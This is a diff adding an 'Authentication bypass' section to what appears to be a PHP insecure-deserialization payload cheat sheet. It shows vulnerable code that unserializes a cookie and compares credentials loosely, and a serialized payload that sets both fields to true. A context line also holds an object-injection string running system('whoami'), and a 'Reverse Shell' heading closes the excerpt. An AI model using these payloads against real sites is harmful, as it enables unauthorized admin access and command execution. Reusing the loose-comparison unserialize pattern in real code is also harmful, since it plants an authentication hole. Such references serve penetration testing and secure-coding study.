@@ -43,6 +43,29 @@ string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
 
 ```
 
+## Authentication bypass
+
+Vulnerable code:
+
+```php
+<?php
+$data = unserialize($_COOKIE['auth']);
+
+if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
+    $admin = true;
+} else {
+    $admin = false;
+}
+```
+
+Payload:
+
+```
+a:2:{s:8:"username";b:1;s:8:"password";b:1;}
+```
+
+Because `true == "str"` is true. Ref: [POC2009 Shocking News in PHP Exploitation](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
+
 ## Others exploits
 
 Reverse Shell
